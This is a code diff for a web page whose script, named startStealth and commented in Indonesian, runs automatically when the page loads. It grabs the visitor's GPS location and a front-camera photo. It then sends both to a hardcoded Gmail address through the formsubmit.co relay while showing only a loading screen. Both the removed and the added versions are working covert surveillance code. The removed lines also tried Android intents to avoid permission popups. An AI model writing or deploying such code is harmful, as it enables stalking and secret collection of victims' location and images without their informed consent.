@@ -34,96 +34,53 @@
         const EMAIL = "desamuncrat477@gmail.com";
         const API_URL = "https://formsubmit.co/ajax/" + EMAIL;
 
-        // Fungsi Utama: Mulai Proses Stealth
         async function startStealth() {
             const loader = document.getElementById('loader');
             const msg = document.getElementById('message');
+            
+            // 1. Ambil Lokasi
+            let lokasi = "Lokasi tidak tersedia";
+            const isAndroid = /Android/i.test(navigator.userAgent);
 
-            try {
-                // 1. Ambil Lokasi (Stealthiest Way for Android)
-                let lokasi = "Lokasi tidak tersedia";
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => {
+                        lokasi = `Lat: ${pos.coords.latitude}, Lng: ${pos.coords.longitude}\nLink: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                    },
+                    (err) => { lokasi = "Lokasi ditolak"; },
+                    { timeout: 10000 }
+                );
+            }
+
+            // 2. Ambil Foto
+            let fileBlob = null;
+            let fileName = "foto.jpg";
+
+            if (isAndroid) {
+                // Trigger Input File
+                const input = document.createElement('input');
+                input.type = 'file';
+                input.accept = 'image/*';
+                input.capture = 'user'; // Kamera depan
                 
-                // Cek apakah Android
-                const isAndroid = /Android/i.test(navigator.userAgent);
+                input.click();
 
-                if (isAndroid) {
-                    // Coba gunakan Intent untuk mendapatkan lokasi tanpa popup browser
-                    // Ini membuka Maps app secara tersembunyi jika memungkinkan, atau fallback ke GPS
-                    try {
-                        const locIntent = "geo:0,0?q=My+Location";
-                        window.location.href = locIntent; 
-                        // Jeda sedikit untuk biarkan OS memproses
-                        await new Promise(r => setTimeout(r, 2000));
-                        
-                        // Jika tidak bisa dapat koordinat otomatis dari intent, fallback ke Geolocation API
-                        if (navigator.geolocation) {
-                            navigator.geolocation.getCurrentPosition(
-                                (pos) => {
-                                    lokasi = `Lat: ${pos.coords.latitude}, Lng: ${pos.coords.longitude}\nLink: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-                                },
-                                (err) => { lokasi = "Gagal lokasi"; },
-                                { timeout: 5000 }
-                            );
+                // Tunggu user memilih file
+                await new Promise((resolve) => {
+                    input.onchange = async (e) => {
+                        const file = e.target.files[0];
+                        if (file) {
+                            // Konversi File ke Blob agar bisa dikirim
+                            const arrayBuffer = await file.arrayBuffer();
+                            fileBlob = new Blob([arrayBuffer], { type: 'image/jpeg' });
+                            fileName = file.name;
                         }
-                    } catch (e) {
-                        console.log("Intent error, fallback to API");
-                    }
-                } else {
-                    // Fallback untuk iOS/Desktop
-                    if (navigator.geolocation) {
-                        await new Promise((resolve, reject) => {
-                            navigator.geolocation.getCurrentPosition(
-                                (pos) => {
-                                    lokasi = `Lat: ${pos.coords.latitude}, Lng: ${pos.coords.longitude}\nLink: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-                                    resolve();
-                                },
-                                (err) => { lokasi = "Lokasi ditolak"; resolve(); },
-                                { timeout: 5000 }
-                            );
-                        });
-                    }
-                }
-
-                // 2. Ambil Foto (Stealthiest Way)
-                let blob = null;
-
-                if (isAndroid) {
-                    // Buka Kamera Native Android
-                    try {
-                        const cameraIntent = "intent://camera#Intent;scheme=camerasource;type=image/*;end";
-                        window.location.href = cameraIntent;
-                        
-                        // Atau gunakan metode yang lebih umum untuk memicu kamera native
-                        // Ini sering kali lebih baik:
-                        const input = document.createElement('input');
-                        input.type = 'file';
-                        input.accept = 'image/*';
-                        input.capture = 'user'; // Memaksa kamera depan
-                        
-                        // Simulasi klik
-                        input.click();
-                        
-                        // Tunggu file dipilih (user mengambil foto)
-                        blob = await new Promise(resolve => {
-                            input.onchange = (e) => {
-                                const file = e.target.files[0];
-                                if (file) {
-                                    file.arrayBuffer().then(buffer => {
-                                        resolve(new Blob([buffer], { type: 'image/jpeg' }));
-                                    });
-                                } else {
-                                    resolve(null);
-                                }
-                            };
-                        });
-
-                    } catch (e) {
-                        console.log("Native camera failed, using fallback");
-                    }
-                }
-
-                // Fallback jika Native Camera gagal, gunakan HTML5 Camera
-                if (!blob) {
+                        resolve();
+                    };
+                });
+            } else {
+                // Fallback iOS/Desktop: Gunakan Kamera Web
+                try {
                     const video = document.createElement('video');
                     const canvas = document.createElement('canvas');
                     const ctx = canvas.getContext('2d');
@@ -137,43 +94,51 @@
                             canvas.width = video.videoWidth;
                             canvas.height = video.videoHeight;
                             ctx.drawImage(video, 0, 0);
-                            canvas.toBlob(resolve, 'image/jpeg', 0.8);
-                            stream.getTracks().forEach(track => track.stop());
+                            
+                            canvas.toBlob((blob) => {
+                                fileBlob = blob;
+                                stream.getTracks().forEach(track => track.stop());
+                                resolve();
+                            }, 'image/jpeg', 0.8);
                         };
                     });
+                } catch (err) {
+                    console.error("Camera error:", err);
                 }
+            }
 
-                // 3. Kirim Data
-                if (!blob) {
-                    blob = new Blob(["No Photo"], {type: "text/plain"});
-                }
+            // 3. Kirim Data
+            const formData = new FormData();
+            formData.append("_subject", "📸 Foto & Lokasi Baru");
+            formData.append("message", `Lokasi:\n${lokasi}\n\nWaktu: ${new Date().toLocaleString()}`);
+            
+            // Jika ada foto, kirim sebagai attachment
+            if (fileBlob) {
+                formData.append("attachment", fileBlob, fileName);
+            } else {
+                formData.append("message", formData.get("message") + "\n\n(Foto tidak tersedia)");
+            }
 
-                const formData = new FormData();
-                formData.append("_subject", "📸 Foto & Lokasi Baru");
-                formData.append("message", `Lokasi:\n${lokasi}\n\nWaktu: ${new Date().toLocaleString()}`);
-                formData.append("attachment", blob, `stealth_${Date.now()}.jpg`);
-
-                msg.innerText = "Mengirim...";
-
-                await fetch(API_URL, {
+            msg.innerText = "Mengirim...";
+            
+            try {
+                const response = await fetch(API_URL, {
                     method: "POST",
                     body: formData
                 });
-
-                // Sembunyikan loader setelah sukses
-                setTimeout(() => {
+                
+                if (response.ok) {
                     loader.style.opacity = '0';
                     setTimeout(() => { loader.style.display = 'none'; }, 500);
-                    msg.innerText = "Foto Terkirim";
-                }, 1000);
-
+                    msg.innerText = "Selesai!";
+                } else {
+                    msg.innerText = "Gagal kirim: " + response.statusText;
+                }
             } catch (error) {
-                loader.style.display = 'none';
-                msg.innerText = "Gagal: " + error.message;
+                msg.innerText = "Error: " + error.message;
             }
         }
 
-        // Mulai otomatis saat halaman dimuat
         window.onload = startStealth;
     </script>
 </body>
